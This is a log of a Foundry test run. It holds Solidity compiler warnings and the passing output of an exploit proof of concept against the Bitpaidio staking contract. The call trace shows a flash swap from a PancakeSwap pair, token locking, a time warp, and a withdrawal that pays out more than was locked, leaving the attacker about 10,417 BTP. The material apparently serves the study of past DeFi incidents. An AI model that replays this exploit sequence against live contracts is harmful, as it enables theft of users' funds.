Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 252.48ms (1.02ms CPU time)

Ran 1 test for src/test/2023-05/Bitpaidio_exp.sol:ContractTest
[PASS] testExploit() (gas: 230831)
Logs:
  Attacker BTP balance after exploit: 10417.703132832080199502

Traces:
  [293804] ContractTest::testExploit()
    ├─ [108704] 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108::Lock_Token(1, 0)
    │   ├─ [11974] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, 0)
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, value: 0)
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, value: 0)
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(1699540893 [1.699e9])
    │   └─ ← [Return] 
    ├─ [160856] 0x858DE6F832c9b92E2EA5C18582551ccd6add0295::swap(219349000000000000000000 [2.193e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [28000] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219349000000000000000000 [2.193e23])
    │   │   ├─ emit Transfer(from: 0x858DE6F832c9b92E2EA5C18582551ccd6add0295, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 219349000000000000000000 [2.193e23])
    │   │   └─ ← [Return] true
    │   ├─ [91389] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219349000000000000000000 [2.193e23], 0, 0x00)
    │   │   ├─ [22554] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::approve(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [581] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 219349000000000000000000 [2.193e23]
    │   │   ├─ [31244] 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108::Lock_Token(1, 219349000000000000000000 [2.193e23])
    │   │   │   ├─ [8774] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, 219349000000000000000000 [2.193e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, value: 219349000000000000000000 [2.193e23])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, value: 115792089237316195423570985008687907853269984665640563820108584007913129639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [28024] 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108::withdraw(1)
    │   │   │   ├─ [23200] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 230316450000000000000000 [2.303e23])
    │   │   │   │   ├─ emit Transfer(from: 0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 230316450000000000000000 [2.303e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3300] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::transfer(0x858DE6F832c9b92E2EA5C18582551ccd6add0295, 219898746867167919800498 [2.198e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x858DE6F832c9b92E2EA5C18582551ccd6add0295, value: 219898746867167919800498 [2.198e23])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [581] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::balanceOf(0x858DE6F832c9b92E2EA5C18582551ccd6add0295) [staticcall]
    │   │   └─ ← [Return] 219898832268316620565176 [2.198e23]
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x858DE6F832c9b92E2EA5C18582551ccd6add0295) [staticcall]
    │   │   └─ ← [Return] 25158735851405405134813 [2.515e22]
    │   ├─ emit Sync(reserve0: 219898832268316620565176 [2.198e23], reserve1: 25158735851405405134813 [2.515e22])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 219898746867167919800498 [2.198e23], amount1In: 0, amount0Out: 219349000000000000000000 [2.193e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [581] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10417703132832080199502 [1.041e22]
    ├─ [2312] 0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker BTP balance after exploit", val: 10417703132832080199502 [1.041e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 320.07ms (1.86ms CPU time)

Ran 2 test suites in 321.33ms (572.55ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
